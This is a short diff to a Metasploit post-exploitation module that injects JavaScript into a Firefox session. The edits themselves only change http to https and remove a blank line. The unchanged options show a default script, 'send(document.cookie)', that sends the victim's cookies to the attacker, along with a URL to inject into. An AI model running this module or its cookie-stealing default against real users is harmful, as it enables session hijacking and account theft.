@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -7,7 +7,6 @@ require 'json'
 require 'msf/core/payload/firefox'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Payload::Firefox
   include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
@@ -29,7 +28,7 @@ class MetasploitModule < Msf::Post
       OptString.new('SCRIPT', [true, "The javascript command to run", 'send(document.cookie)']),
       OptPath.new('SCRIPTFILE', [false, "The javascript file to run"]),
       OptString.new('URL', [
-        true, "URL to inject into", 'http://metasploit.com'
+        true, "URL to inject into", 'https://metasploit.com'
       ]),
       OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
     ])
